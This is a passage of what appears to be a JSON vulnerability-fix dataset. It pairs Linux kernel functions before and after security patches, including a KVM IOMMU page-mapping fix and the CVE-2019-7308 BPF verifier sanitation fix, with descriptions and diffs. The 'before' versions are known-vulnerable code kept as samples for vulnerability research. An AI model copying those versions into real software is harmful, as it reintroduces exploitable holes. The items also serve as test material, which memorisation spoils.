unmap_pages;\n\t\t}\n\n\t\tgfn += page_size >> PAGE_SHIFT;\n\n\n\t}\n\n\treturn 0;\n\nunmap_pages:\n\tkvm_iommu_put_pages(kvm, slot->base_gfn, gfn);\n\treturn r;\n}",
        "func": "int kvm_iommu_map_pages(struct kvm *kvm, struct kvm_memory_slot *slot)\n{\n\tgfn_t gfn, end_gfn;\n\tpfn_t pfn;\n\tint r = 0;\n\tstruct iommu_domain *domain = kvm->arch.iommu_domain;\n\tint flags;\n\n\t/* check if iommu exists and in use */\n\tif (!domain)\n\t\treturn 0;\n\n\tgfn     = slot->base_gfn;\n\tend_gfn = gfn + slot->npages;\n\n\tflags = IOMMU_READ;\n\tif (!(slot->flags & KVM_MEM_READONLY))\n\t\tflags |= IOMMU_WRITE;\n\tif (!kvm->arch.iommu_noncoherent)\n\t\tflags |= IOMMU_CACHE;\n\n\n\twhile (gfn < end_gfn) {\n\t\tunsigned long page_size;\n\n\t\t/* Check if already mapped */\n\t\tif (iommu_iova_to_phys(domain, gfn_to_gpa(gfn))) {\n\t\t\tgfn += 1;\n\t\t\tcontinue;\n\t\t}\n\n\t\t/* Get the page size we could use to map */\n\t\tpage_size = kvm_host_page_size(kvm, gfn);\n\n\t\t/* Make sure the page_size does not exceed the memslot */\n\t\twhile ((gfn + (page_size >> PAGE_SHIFT)) > end_gfn)\n\t\t\tpage_size >>= 1;\n\n\t\t/* Make sure gfn is aligned to the page size we want to map */\n\t\twhile ((gfn << PAGE_SHIFT) & (page_size - 1))\n\t\t\tpage_size >>= 1;\n\n\t\t/* Make sure hva is aligned to the page size we want to map */\n\t\twhile (__gfn_to_hva_memslot(slot, gfn) & (page_size - 1))\n\t\t\tpage_size >>= 1;\n\n\t\t/*\n\t\t * Pin all pages we are about to map in memory. This is\n\t\t * important because we unmap and unpin in 4kb steps later.\n\t\t */\n\t\tpfn = kvm_pin_pages(slot, gfn, page_size);\n\t\tif (is_error_noslot_pfn(pfn)) {\n\t\t\tgfn += 1;\n\t\t\tcontinue;\n\t\t}\n\n\t\t/* Map into IO address space */\n\t\tr = iommu_map(domain, gfn_to_gpa(gfn), pfn_to_hpa(pfn),\n\t\t\t      page_size, flags);\n\t\tif (r) {\n\t\t\tprintk(KERN_ERR \"kvm_iommu_map_address:\"\n\t\t\t       \"iommu failed to map pfn=%llx\\n\", pfn);\n\t\t\tkvm_unpin_pages(kvm, pfn, page_size);\n\t\t\tgoto unmap_pages;\n\t\t}\n\n\t\tgfn += page_size >> PAGE_SHIFT;\n\n\n\t}\n\n\treturn 0;\n\nunmap_pages:\n\tkvm_iommu_put_pages(kvm, slot->base_gfn, gfn - slot->base_gfn);\n\treturn r;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -60,6 +60,7 @@\n \t\tif (r) {\n \t\t\tprintk(KERN_ERR \"kvm_iommu_map_address:\"\n \t\t\t       \"iommu failed to map pfn=%llx\\n\", pfn);\n+\t\t\tkvm_unpin_pages(kvm, pfn, page_size);\n \t\t\tgoto unmap_pages;\n \t\t}\n \n@@ -71,6 +72,6 @@\n \treturn 0;\n \n unmap_pages:\n-\tkvm_iommu_put_pages(kvm, slot->base_gfn, gfn);\n+\tkvm_iommu_put_pages(kvm, slot->base_gfn, gfn - slot->base_gfn);\n \treturn r;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\tkvm_iommu_put_pages(kvm, slot->base_gfn, gfn);"
            ],
            "added_lines": [
                "\t\t\tkvm_unpin_pages(kvm, pfn, page_size);",
                "\tkvm_iommu_put_pages(kvm, slot->base_gfn, gfn - slot->base_gfn);"
            ]
        }
    },
    {
        "cve_id": "CVE-2019-7308",
        "func_name": "torvalds/linux/sanitize_ptr_alu",
        "description": "kernel/bpf/verifier.c in the Linux kernel before 4.20.6 performs undesirable out-of-bounds speculation on pointer arithmetic in various cases, including cases of different branches with different state or limits to sanitize, leading to side-channel attacks.",
        "git_url": "https://github.com/torvalds/linux/commit/d3bd7413e0ca40b60cf60d4003246d067cafdeda",
        "commit_title": "bpf: fix sanitation of alu op with pointer / scalar type from different paths",
        "commit_text": " While 979d63d50c0c (\"bpf: prevent out of bounds speculation on pointer arithmetic\") took care of rejecting alu op on pointer when e.g. pointer came from two different map values with different map properties such as value size, Jann reported that a case was not covered yet when a given alu op is used in both \"ptr_reg += reg\" and \"numeric_reg += reg\" from different branches where we would incorrectly try to sanitize based on the pointer's limit. Catch this corner case and reject the program instead. ",
        "func_before": "static int sanitize_ptr_alu(struct bpf_verifier_env *env,\n\t\t\t    struct bpf_insn *insn,\n\t\t\t    const struct bpf_reg_state *ptr_reg,\n\t\t\t    struct bpf_reg_state *dst_reg,\n\t\t\t    bool off_is_neg)\n{\n\tstruct bpf_verifier_state *vstate = env->cur_state;\n\tstruct bpf_insn_aux_data *aux = cur_aux(env);\n\tbool ptr_is_dst_reg = ptr_reg == dst_reg;\n\tu8 opcode = BPF_OP(insn->code);\n\tu32 alu_state, alu_limit;\n\tstruct bpf_reg_state tmp;\n\tbool ret;\n\n\tif (env->allow_ptr_leaks || BPF_SRC(insn->code) == BPF_K)\n\t\treturn 0;\n\n\t/* We already marked aux for masking from non-speculative\n\t * paths, thus we got here in the first place. We only care\n\t * to explore bad access from here.\n\t */\n\tif (vstate->speculative)\n\t\tgoto do_sim;\n\n\talu_state  = off_is_neg ? BPF_ALU_NEG_VALUE : 0;\n\talu_state |= ptr_is_dst_reg ?\n\t\t     BPF_ALU_SANITIZE_SRC : BPF_ALU_SANITIZE_DST;\n\n\tif (retrieve_ptr_limit(ptr_reg, &alu_limit, opcode, off_is_neg))\n\t\treturn 0;\n\n\t/* If we arrived here from different branches with different\n\t * limits to sanitize, then this won't work.\n\t */\n\tif (aux->alu_state &&\n\t    (aux->alu_state != alu_state ||\n\t     aux->alu_limit != alu_limit))\n\t\treturn -EACCES;\n\n\t/* Corresponding fixup done in fixup_bpf_calls(). */\n\taux->alu_state = alu_state;\n\taux->alu_limit = alu_limit;\n\ndo_sim:\n\t/* Simulate and find potential out-of-bounds access under\n\t * speculative execution from truncation as a result of\n\t * masking when off was not within expected range. If off\n\t * sits in dst, then we temporarily need to move ptr there\n\t * to simulate dst (== 0) +/-= ptr. Needed, for example,\n\t * for cases where we use K-based arithmetic in one direction\n\t * and truncated reg-based in the other in order to explore\n\t * bad access.\n\t */\n\tif (!ptr_is_dst_reg) {\n\t\ttmp = *dst_reg;\n\t\t*dst_reg = *ptr_reg;\n\t}\n\tret = push_stack(env, env->insn_idx + 1, env->insn_idx, true);\n\tif (!ptr_is_dst_reg)\n\t\t*dst_reg = tmp;\n\treturn !ret ? -EFAULT : 0;\n}",
        "func": "static int sanitize_ptr_alu(struct bpf_verifier_env *env,\n\t\t\t    struct bpf_insn *insn,\n\t\t\t    const struct bpf_reg_state *ptr_reg,\n\t\t\t    struct bpf_reg_state *dst_reg,\n\t\t\t    bool off_is_neg)\n{\n\tstruct bpf_verifier_state *vstate = env->cur_state;\n\tstruct bpf_insn_aux_data *aux = cur_aux(env);\n\tbool ptr_is_dst_reg = ptr_reg == dst_reg;\n\tu8 opcode = BPF_OP(insn->code);\n\tu32 alu_state, alu_limit;\n\tstruct bpf_reg_state tmp;\n\tbool ret;\n\n\tif (can_skip_alu_sanitation(env, insn))\n\t\treturn 0;\n\n\t/* We already marked aux for masking from non-speculative\n\t * paths, thus we got here in the first place. We only care\n\t * to explore bad access from here.\n\t */\n\tif (vstate->speculative)\n\t\tgoto do_sim;\n\n\talu_state  = off_is_neg ? BPF_ALU_NEG_VALUE : 0;\n\talu_state |= ptr_is_dst_reg ?\n\t\t     BPF_ALU_SANITIZE_SRC : BPF_ALU_SANITIZE_DST;\n\n\tif (retrieve_ptr_limit(ptr_reg, &alu_limit, opcode, off_is_neg))\n\t\treturn 0;\n\tif (update_alu_sanitation_state(aux, alu_state, alu_limit))\n\t\treturn -EACCES;\ndo_sim:\n\t/* Simulate and find potential out-of-bounds access under\n\t * speculative execution from truncation as a result of\n\t * masking when off was not within expected range. If off\n\t * sits in dst, then we temporarily need to move ptr there\n\t * to simulate dst (== 0) +/-= ptr. Needed, for example,\n\t * for cases where we use K-based arithmetic in one direction\n\t * and truncated reg-based in the other in order to explore\n\t * bad access.\n\t */\n\tif (!ptr_is_dst_reg) {\n\t\ttmp = *dst_reg;\n\t\t*dst_reg = *ptr_reg;\n\t}\n\tret = push_stack(env, env->insn_idx + 1, env->insn_idx, true);\n\tif (!ptr_is_dst_reg)\n\t\t*dst_reg = tmp;\n\treturn !ret ? -EFAULT : 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -12,7 +12,7 @@\n \tstruct bpf_reg_state tmp;\n \tbool ret;\n \n-\tif (env->allow_ptr_leaks || BPF_SRC(insn->code) == BPF_K)\n+\tif (can_skip_alu_sanitation(env, insn))\n \t\treturn 0;\n \n \t/* We already marked aux for masking from non-speculative\n@@ -28,19 +28,8 @@\n \n \tif (retrieve_ptr_limit(ptr_reg, &alu_limit, opcode, off_is_neg))\n \t\treturn 0;\n-\n-\t/* If we arrived here from different branches with different\n-\t * limits to sanitize, then this won't work.\n-\t */\n-\tif (aux->alu_state &&\n-\t    (aux->alu_state != alu_state ||\n-\t     aux->alu_limit != alu_limit))\n+\tif (update_alu_sanitation_state(aux, alu_state, alu_limit))\n \t\treturn -EACCES;\n-\n-\t/* Corresponding fixup done in fixup_bpf_calls(). */\n-\taux->alu_state = alu_state;\n-\taux->alu_limit = alu_limit;\n-\n do_sim:\n \t/* Simulate and find potential out-of-bounds access under\n \t * speculative execution from truncation as a result of",
        "diff_line_info": {
            "deleted_lines": [
                "\tif (env->allow_ptr_leaks || BPF_SRC(insn->code) == BPF_K)",
                "",
                "\t/* If we arrived here from different branches with different",
                "\t * limits to sanitize, then this won't work.",
                "\t */",
                "\tif (aux->alu_state &&",
                "\t    (aux->alu_state != alu_state ||",
                "\t     aux->alu_limit != alu_limit))",
                "",
                "\t/* Corresponding fixup done in fixup_bpf_calls(). */",
                "\taux->alu_state = alu_state;",
                "\taux->alu_limit = alu_limit;",
                ""
            ],
            "added_lines": [
                "\tif (can_skip_alu_sanitation(env, insn))",
                "\tif (update_alu_sanitation_state(aux, alu_state, alu_limit))"
            ]
        }
    },
    {
        "cve_id": "CVE-2019-7308",
        "func_name": "torvalds/linux/adjust_scalar_min_max_vals",
        "description": "kernel/bpf/verifier.c in the Linux kernel before 4.20.6 performs undesirable out-of-bounds speculation on pointer arithmetic in various cases, including cases of different branches with different state or limits to sanitize, leading to side-channel attacks.",
        "git_url": "https://github.com/torvalds/linux/commit/d3bd7413e0ca40b60cf60d4003246d067cafdeda",
        "commit_title": "bpf: fix sanitation of alu op with pointer / scalar type from different paths",
        "commit_text": " While 979d63d50c0c (\"bpf: prevent out of bounds speculation on pointer arithmetic\") took care of rejecting alu op on pointer when e.g. pointer came from two different map values with different map properties such as value size, Jann reported that a case was not covered yet when a given alu op is used in both \"ptr_reg += reg\" and \"numeric_reg += reg\" from different branches where we would incorrectly try to sanitize based on the pointer's limit. Catch this corner case and reject the program instead. ",
        "func_before": "static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,\n\t\t\t\t      struct bpf_insn *insn,\n\t\t\t\t      struct bpf_reg_state *dst_reg,\n\t\t\t\t      struct bpf_reg_state src_reg)\n{\n\tstruct bpf_reg_state *regs = cur_regs(env);\n\tu8 opcode = BPF_OP(insn->code);\n\tbool src_known, dst_known;\n\ts64 smin_val, smax_val;\n\tu64 umin_val, umax_val;\n\tu64 insn_bitness = (BPF_CLASS(insn->code) == BPF_ALU64) ? 64 : 32;\n\n\tif (insn_bitness == 32) {\n\t\t/* Relevant for 32-bit RSH: Information can propagate towards\n\t\t * LSB, so it isn't sufficient to only truncate the output to\n\t\t * 32 bits.\n\t\t */\n\t\tcoerce_reg_to_size(dst_reg, 4);\n\t\tcoerce_reg_to_size(&src_reg, 4);\n\t}\n\n\tsmin_val = src_reg.smin_value;\n\tsmax_val = src_reg.smax_value;\n\tumin_val = src_reg.umin_value;\n\tumax_val = src_reg.umax_value;\n\tsrc_known = tnum_is_const(src_reg.var_off);\n\tdst_known = tnum_is_const(dst_reg->var_off);\n\n\tif ((src_known && (smin_val != smax_val || umin_val != umax_val)) ||\n\t    smin_val > smax_val || umin_val > umax_val) {\n\t\t/* Taint dst register if offset had invalid bounds derived from\n\t\t * e.g. dead branches.\n\t\t */\n\t\t__mark_reg_unknown(dst_reg);\n\t\treturn 0;\n\t}\n\n\tif (!src_known &&\n\t    opcode != BPF_ADD && opcode != BPF_SUB && opcode != BPF_AND) {\n\t\t__mark_reg_unknown(dst_reg);\n\t\treturn 0;\n\t}\n\n\tswitch (opcode) {\n\tcase BPF_ADD:\n\t\tif (signed_add_overflows(dst_reg->smin_value, smin_val) ||\n\t\t    signed_add_overflows(dst_reg->smax_value, smax_val)) {\n\t\t\tdst_reg->smin_value = S64_MIN;\n\t\t\tdst_reg->smax_value = S64_MAX;\n\t\t} else {\n\t\t\tdst_reg->smin_value += smin_val;\n\t\t\tdst_reg->smax_value += smax_val;\n\t\t}\n\t\tif (dst_reg->umin_value + umin_val < umin_val ||\n\t\t    dst_reg->umax_value + umax_val < umax_val) {\n\t\t\tdst_reg->umin_value = 0;\n\t\t\tdst_reg->umax_value = U64_MAX;\n\t\t} else {\n\t\t\tdst_reg->umin_value += umin_val;\n\t\t\tdst_reg->umax_value += umax_val;\n\t\t}\n\t\tdst_reg->var_off = tnum_add(dst_reg->var_off, src_reg.var_off);\n\t\tbreak;\n\tcase BPF_SUB:\n\t\tif (signed_sub_overflows(dst_reg->smin_value, smax_val) ||\n\t\t    signed_sub_overflows(dst_reg->smax_value, smin_val)) {\n\t\t\t/* Overflow possible, we know nothing */\n\t\t\tdst_reg->smin_value = S64_MIN;\n\t\t\tdst_reg->smax_value = S64_MAX;\n\t\t} else {\n\t\t\tdst_reg->smin_value -= smax_val;\n\t\t\tdst_reg->smax_value -= smin_val;\n\t\t}\n\t\tif (dst_reg->umin_value < umax_val) {\n\t\t\t/* Overflow possible, we know nothing */\n\t\t\tdst_reg->umin_value = 0;\n\t\t\tdst_reg->umax_value = U64_MAX;\n\t\t} else {\n\t\t\t/* Cannot overflow (as long as bounds are consistent) */\n\t\t\tdst_reg->umin_value -= umax_val;\n\t\t\tdst_reg->umax_value -= umin_val;\n\t\t}\n\t\tdst_reg->var_off = tnum_sub(dst_reg->var_off, src_reg.var_off);\n\t\tbreak;\n\tcase BPF_MUL:\n\t\tdst_reg->var_off = tnum_mul(dst_reg->var_off, src_reg.var_off);\n\t\tif (smin_val < 0 || dst_reg->smin_value < 0) {\n\t\t\t/* Ain't nobody got time to multiply that sign */\n\t\t\t__mark_reg_unbounded(dst_reg);\n\t\t\t__update_reg_bounds(dst_reg);\n\t\t\tbreak;\n\t\t}\n\t\t/* Both values are positive, so we can work with unsigned and\n\t\t * copy the result to signed (unless it exceeds S64_MAX).\n\t\t */\n\t\tif (umax_val > U32_MAX || dst_reg->umax_value > U32_MAX) {\n\t\t\t/* Potential overflow, we know nothing */\n\t\t\t__mark_reg_unbounded(dst_reg);\n\t\t\t/* (except what we can learn from the var_off) */\n\t\t\t__update_reg_bounds(dst_reg);\n\t\t\tbreak;\n\t\t}\n\t\tdst_reg->umin_value *= umin_val;\n\t\tdst_reg->umax_value *= umax_val;\n\t\tif (dst_reg->umax_value > S64_MAX) {\n\t\t\t/* Overflow possible, we know nothing */\n\t\t\tdst_reg->smin_value = S64_MIN;\n\t\t\tdst_reg->smax_value = S64_MAX;\n\t\t} else {\n\t\t\tdst_reg->smin_value = dst_reg->umin_value;\n\t\t\tdst_reg->smax_value = dst_reg->umax_value;\n\t\t}\n\t\tbreak;\n\tcase BPF_AND:\n\t\tif (src_known && dst_known) {\n\t\t\t__mark_reg_known(dst_reg, dst_reg->var_off.value &\n\t\t\t\t\t\t  src_reg.var_off.value);\n\t\t\tbreak;\n\t\t}\n\t\t/* We get our minimum from the var_off, since that's inherently\n\t\t * bitwise.  Our maximum is the minimum of the operands' maxima.\n\t\t */\n\t\tdst_reg->var_off = tnum_and(dst_reg->var_off, src_reg.var_off);\n\t\tdst_reg->umin_value = dst_reg->var_off.value;\n\t\tdst_reg->umax_value = min(dst_reg->umax_value, umax_val);\n\t\tif (dst_reg->smin_value < 0 || smin_val < 0) {\n\t\t\t/* Lose signed bounds when ANDing negative numbers,\n\t\t\t * ain't nobody got time for that.\n\t\t\t */\n\t\t\tdst_reg->smin_value = S64_MIN;\n\t\t\tdst_reg->smax_value = S64_MAX;\n\t\t} else {\n\t\t\t/* ANDing two positives gives a positive, so safe to\n\t\t\t * cast result into s64.\n\t\t\t */\n\t\t\tdst_reg->smin_value = dst_reg->umin_value;\n\t\t\tdst_reg->smax_value = dst_reg->umax_value;\n\t\t}\n\t\t/* We may learn something more from the var_off */\n\t\t__update_reg_bounds(dst_reg);\n\t\tbreak;\n\tcase BPF_OR:\n\t\tif (src_known && dst_known) {\n\t\t\t__mark_reg_known(dst_reg, dst_reg->var_off.value |\n\t\t\t\t\t\t  src_reg.var_off.value);\n\t\t\tbreak;\n\t\t}\n\t\t/* We get our maximum from the var_off, and our minimum is the\n\t\t * maximum of the operands' minima\n\t\t */\n\t\tdst_reg->var_off = tnum_or(dst_reg->var_off, src_reg.var_off);\n\t\tdst_reg->umin_value = max(dst_reg->umin_value, umin_val);\n\t\tdst_reg->umax_value = dst_reg->var_off.value |\n\t\t\t\t      dst_reg->var_off.mask;\n\t\tif (dst_reg->smin_value < 0 || smin_val < 0) {\n\t\t\t/* Lose signed bounds when ORing negative numbers,\n\t\t\t * ain't nobody got time for that.\n\t\t\t */\n\t\t\tdst_reg->smin_value = S64_MIN;\n\t\t\tdst_reg->smax_value = S64_MAX;\n\t\t} else {\n\t\t\t/* ORing two positives gives a positive, so safe to\n\t\t\t * cast result into s64.\n\t\t\t */\n\t\t\tdst_reg->smin_value = dst_reg->umin_value;\n\t\t\tdst_reg->smax_value = dst_reg->umax_value;\n\t\t}\n\t\t/* We may learn something more from the var_off */\n\t\t__update_reg_bounds(dst_reg);\n\t\tbreak;\n\tcase BPF_LSH:\n\t\tif (umax_val >= insn_bitness) {\n\t\t\t/* Shifts greater than 31 or 63 are undefined.\n\t\t\t * This includes shifts by a negative number.\n\t\t\t */\n\t\t\tmark_reg_unknown(env, regs, insn->dst_reg);\n\t\t\tbreak;\n\t\t}\n\t\t/* We lose all sign bit information (except what we can pick\n\t\t * up from var_off)\n\t\t */\n\t\tdst_reg->smin_value = S64_MIN;\n\t\tdst_reg->smax_value = S64_MAX;\n\t\t/* If we might shift our top bit out, then we know nothing */\n\t\tif (dst_reg->umax_value > 1ULL << (63 - umax_val)) {\n\t\t\tdst_reg->umin_value = 0;\n\t\t\tdst_reg->umax_value = U64_MAX;\n\t\t} else {\n\t\t\tdst_reg->umin_value <<= umin_val;\n\t\t\tdst_reg->umax_value <<= umax_val;\n\t\t}\n\t\tdst_reg->var_off = tnum_lshift(dst_reg->var_off, umin_val);\n\t\t/* We may learn something more from the var_off */\n\t\t__update_reg_bounds(dst_reg);\n\t\tbreak;\n\tcase BPF_RSH:\n\t\tif (umax_val >= insn_bitness) {\n\t\t\t/* Shifts greater than 31 or 63 are undefined.\n\t\t\t * This includes shifts by a negative number.\n\t\t\t */\n\t\t\tmark_reg_unknown(env, regs, insn->dst_reg);\n\t\t\tbreak;\n\t\t}\n\t\t/* BPF_RSH is an unsigned shift.  If the value in dst_reg might\n\t\t * be negative, then either:\n\t\t * 1) src_reg might be zero, so the sign bit of the result is\n\t\t *    unknown, so we lose our signed bounds\n\t\t * 2) it's known negative, thus the unsigned bounds capture the\n\t\t *    signed bounds\n\t\t * 3) the signed bounds cross zero, so they tell us nothing\n\t\t *    about the result\n\t\t * If the value in dst_reg is known nonnegative, then again the\n\t\t * unsigned bounts capture the signed bounds.\n\t\t * Thus, in all cases it suffices to blow away our signed bounds\n\t\t * and rely on inferring new ones from the unsigned bounds and\n\t\t * var_off of the result.\n\t\t */\n\t\tdst_reg->smin_value = S64_MIN;\n\t\tdst_reg->smax_value = S64_MAX;\n\t\tdst_reg->var_off = tnum_rshift(dst_reg->var_off, umin_val);\n\t\tdst_reg->umin_value >>= umax_val;\n\t\tdst_reg->umax_value >>= umin_val;\n\t\t/* We may learn something more from the var_off */\n\t\t__update_reg_bounds(dst_reg);\n\t\tbreak;\n\tcase BPF_ARSH:\n\t\tif (umax_val >= insn_bitness) {\n\t\t\t/* Shifts greater than 31 or 63 are undefined.\n\t\t\t * This includes shifts by a negative number.\n\t\t\t */\n\t\t\tmark_reg_unknown(env, regs, insn->dst_reg);\n\t\t\tbreak;\n\t\t}\n\n\t\t/* Upon reaching here, src_known is true and\n\t\t * umax_val is equal to umin_val.\n\t\t */\n\t\tdst_reg->smin_value >>= umin_val;\n\t\tdst_reg->smax_value >>= umin_val;\n\t\tdst_reg->var_off = tnum_arshift(dst_reg->var_off, umin_val);\n\n\t\t/* blow away the dst_reg umin_value/umax_value and rely on\n\t\t * dst_reg var_off to refine the result.\n\t\t */\n\t\tdst_reg->umin_value = 0;\n\t\tdst_reg->umax_value = U64_MAX;\n\t\t__update_reg_bounds(dst_reg);\n\t\tbreak;\n\tdefault:\n\t\tmark_reg_unknown(env, regs, insn->dst_reg);\n\t\tbreak;\n\t}\n\n\tif (BPF_CLASS(insn->code) != BPF_ALU64) {\n\t\t/* 32-bit ALU ops are (32,32)->32 */\n\t\tcoerce_reg_to_size(dst_reg, 4);\n\t}\n\n\t__reg_deduce_bounds(dst_reg);\n\t__reg_bound_offset(dst_reg);\n\treturn 0;\n}",
        "func": "static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,\n\t\t\t\t      struct bpf_insn *insn,\n\t\t\t\t      struct bpf_reg_state *dst_reg,\n\t\t\t\t      struct bpf_reg_state src_reg)\n{\n\tstruct bpf_reg_state *regs = cur_regs(env);\n\tu8 opcode = BPF_OP(insn->code);\n\tbool src_known, dst_known;\n\ts64 smin_val, smax_val;\n\tu64 umin_val, umax_val;\n\tu64 insn_bitness = (BPF_CLASS(insn->code) == BPF_ALU64) ? 64 : 32;\n\tu32 dst = insn->dst_reg;\n\tint ret;\n\n\tif (insn_bitness == 32) {\n\t\t/* Relevant for 32-bit RSH: Information can propagate towards\n\t\t * LSB, so it isn't sufficient to only truncate the output to\n\t\t * 32 bits.\n\t\t */\n\t\tcoerce_reg_to_size(dst_reg, 4);\n\t\tcoerce_reg_to_size(&src_reg, 4);\n\t}\n\n\tsmin_val = src_reg.smin_value;\n\tsmax_val = src_reg.smax_value;\n\tumin_val = src_reg.umin_value;\n\tumax_val = src_reg.umax_value;\n\tsrc_known = tnum_is_const(src_reg.var_off);\n\tdst_known = tnum_is_const(dst_reg->var_off);\n\n\tif ((src_known && (smin_val != smax_val || umin_val != umax_val)) ||\n\t    smin_val > smax_val || umin_val > umax_val) {\n\t\t/* Taint dst register if offset had invalid bounds derived from\n\t\t * e.g. dead branches.\n\t\t */\n\t\t__mark_reg_unknown(dst_reg);\n\t\treturn 0;\n\t}\n\n\tif (!src_known &&\n\t    opcode != BPF_ADD && opcode != BPF_SUB && opcode != BPF_AND) {\n\t\t__mark_reg_unknown(dst_reg);\n\t\treturn 0;\n\t}\n\n\tswitch (opcode) {\n\tcase BPF_ADD:\n\t\tret = sanitize_val_alu(env, insn);\n\t\tif (ret < 0) {\n\t\t\tverbose(env, \"R%d tried to add from different pointers or scalars\\n\", dst);\n\t\t\treturn ret;\n\t\t}\n\t\tif (signed_add_overflows(dst_reg->smin_value, smin_val) ||\n\t\t    signed_add_overflows(dst_reg->smax_value, smax_val)) {\n\t\t\tdst_reg->smin_value = S64_MIN;\n\t\t\tdst_reg->smax_value = S64_MAX;\n\t\t} else {\n\t\t\tdst_reg->smin_value += smin_val;\n\t\t\tdst_reg->smax_value += smax_val;\n\t\t}\n\t\tif (dst_reg->umin_value + umin_val < umin_val ||\n\t\t    dst_reg->umax_value + umax_val < umax_val) {\n\t\t\tdst_reg->umin_value = 0;\n\t\t\tdst_reg->umax_value = U64_MAX;\n\t\t} else {\n\t\t\tdst_reg->umin_value += umin_val;\n\t\t\tdst_reg->umax_value += umax_val;\n\t\t}\n\t\tdst_reg->var_off = tnum_add(dst_reg->var_off, src_reg.var_off);\n\t\tbreak;\n\tcase BPF_SUB:\n\t\tret = sanitize_val_alu(env, insn);\n\t\tif (ret < 0) {\n\t\t\tverbose(env, \"R%d tried to sub from different pointers or scalars\\n\", dst);\n\t\t\treturn ret;\n\t\t}\n\t\tif (signed_sub_overflows(dst_reg->smin_value, smax_val) ||\n\t\t    signed_sub_overflows(dst_reg->smax_value, smin_val)) {\n\t\t\t/* Overflow possible, we know nothing */\n\t\t\tdst_reg->smin_value = S64_MIN;\n\t\t\tdst_reg->smax_value = S64_MAX;\n\t\t} else {\n\t\t\tdst_reg->smin_value -= smax_val;\n\t\t\tdst_reg->smax_value -= smin_val;\n\t\t}\n\t\tif (dst_reg->umin_value < umax_val) {\n\t\t\t/* Overflow possible, we know nothing */\n\t\t\tdst_reg->umin_value = 0;\n\t\t\tdst_reg->umax_value = U64_MAX;\n\t\t} else {\n\t\t\t/* Cannot overflow (as long as bounds are consistent) */\n\t\t\tdst_reg->umin_value -= umax_val;\n\t\t\tdst_reg->umax_value -= umin_val;\n\t\t}\n\t\tdst_reg->var_off = tnum_sub(dst_reg->var_off, src_reg.var_off);\n\t\tbreak;\n\tcase BPF_MUL:\n\t\tdst_reg->var_off = tnum_mul(dst_reg->var_off, src_reg.var_off);\n\t\tif (smin_val < 0 || dst_reg->smin_value < 0) {\n\t\t\t/* Ain't nobody got time to multiply that sign */\n\t\t\t__mark_reg_unbounded(dst_reg);\n\t\t\t__update_reg_bounds(dst_reg);\n\t\t\tbreak;\n\t\t}\n\t\t/* Both values are positive, so we can work with unsigned and\n\t\t * copy the result to signed (unless it exceeds S64_MAX).\n\t\t */\n\t\tif (umax_val > U32_MAX || dst_reg->umax_value > U32_MAX) {\n\t\t\t/* Potential overflow, we know nothing */\n\t\t\t__mark_reg_unbounded(dst_reg);\n\t\t\t/* (except what we can learn from the var_off) */\n\t\t\t__update_reg_bounds(dst_reg);\n\t\t\tbreak;\n\t\t}\n\t\tdst_reg->umin_value *= umin_val;\n\t\tdst_reg->umax_value *= umax_val;\n\t\tif (dst_reg->umax_value > S64_MAX) {\n\t\t\t/* Overflow possible, we know nothing */\n\t\t\tdst_reg->smin_value = S64_MIN;\n\t\t\tdst_reg->smax_value = S64_MAX;\n\t\t} else {\n\t\t\tdst_reg->smin_value = dst_reg->umin_value;\n\t\t\tdst_reg->smax_value = dst_reg->umax_value;\n\t\t}\n\t\tbreak;\n\tcase BPF_AND:\n\t\tif (src_known && dst_known) {\n\t\t\t__mark_reg_known(dst_reg, dst_reg->var_off.value &\n\t\t\t\t\t\t  src_reg.var_off.value);\n\t\t\tbreak;\n\t\t}\n\t\t/* We get our minimum from the var_off, since that's inherently\n\t\t * bitwise.  Our maximum is the minimum of the operands' maxima.\n\t\t */\n\t\tdst_reg->var_off = tnum_and(dst_reg->var_off, src_reg.var_off);\n\t\tdst_reg->umin_value = dst_reg->var_off.value;\n\t\tdst_reg->umax_value = min(dst_reg->umax_value, umax_val);\n\t\tif (dst_reg->smin_value < 0 || smin_val < 0) {\n\t\t\t/* Lose signed bounds when ANDing negative numbers,\n\t\t\t * ain't nobody got time for that.\n\t\t\t */\n\t\t\tdst_reg->smin_value = S64_MIN;\n\t\t\tdst_reg->smax_value = S64_MAX;\n\t\t} else {\n\t\t\t/* ANDing two positives gives a positive, so safe to\n\t\t\t * cast result into s64.\n\t\t\t */\n\t\t\tdst_reg->smin_value = dst_reg->umin_value;\n\t\t\tdst_reg->smax_value = dst_reg->umax_value;\n\t\t}\n\t\t/* We may learn something more from the var_off */\n\t\t__update_reg_bounds(dst_reg);\n\t\tbreak;\n\tcase BPF_OR:\n\t\tif (src_known && dst_known) {\n\t\t\t__mark_reg_known(dst_reg, dst_reg->var_off.value |\n\t\t\t\t\t\t  src_reg.var_off.value);\n\t\t\tbreak;\n\t\t}\n\t\t/* We get our maximum from the var_off, and our minimum is the\n\t\t * maximum of the operands' minima\n\t\t */\n\t\tdst_reg->var_off = tnum_or(dst_reg->var_off, src_reg.var_off);\n\t\tdst_reg->umin_value = max(dst_reg->umin_value, umin_val);\n\t\tdst_reg->umax_value = dst_reg->var_off.value |\n\t\t\t\t      dst_reg->var_off.mask;\n\t\tif (dst_reg->smin_value < 0 || smin_val < 0) {\n\t\t\t/* Lose signed bounds when ORing negative numbers,\n\t\t\t * ain't nobody got time for that.\n\t\t\t */\n\t\t\tdst_reg->smin_value = S64_MIN;\n\t\t\tdst_reg->smax_value = S64_MAX;\n\t\t} else {\n\t\t\t/* ORing two positives gives a positive, so safe to\n\t\t\t * cast result into s64.\n\t\t\t */\n\t\t\tdst_reg->smin_value = dst_reg->umin_value;\n\t\t\tdst_reg->smax_value = dst_reg->umax_value;\n\t\t}\n\t\t/* We may learn something more from the var_off */\n\t\t__update_reg_bounds(dst_reg);\n\t\tbreak;\n\tcase BPF_LSH:\n\t\tif (umax_val >= insn_bitness) {\n\t\t\t/* Shifts greater than 31 or 63 are undefined.\n\t\t\t * This includes shifts by a negative number.\n\t\t\t */\n\t\t\tmark_reg_unknown(env, regs, insn->dst_reg);\n\t\t\tbreak;\n\t\t}\n\t\t/* We lose all sign bit information (except what we can pick\n\t\t * up from var_off)\n\t\t */\n\t\tdst_reg->smin_value = S64_MIN;\n\t\tdst_reg->smax_value = S64_MAX;\n\t\t/* If we might shift our top bit out, then we know nothing */\n\t\tif (dst_reg->umax_value > 1ULL << (63 - umax_val)) 